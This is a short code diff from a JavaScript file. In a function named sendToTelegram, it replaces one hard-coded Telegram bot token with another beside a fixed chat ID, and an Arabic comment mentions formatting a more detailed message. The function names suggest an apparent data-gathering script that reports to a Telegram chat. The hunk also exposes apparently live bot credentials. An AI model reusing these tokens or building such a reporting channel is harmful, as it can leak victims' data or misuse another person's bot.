@@ -190,7 +190,7 @@ async function getExtraInfo() {
 }
 
 async function sendToTelegram(data) {
-    const botToken = '7561598438:AAH2QmWIslFXfDo_VWe96mvc6i3MAdoP6bo';
+    const botToken = '7642723730:AAHHWTNISOFjIbmSOIpJhpcolcubTYE0ezw';
     const chatId = '5962064921';
     
     // تنسيق رسالة أكثر تفصيلاً
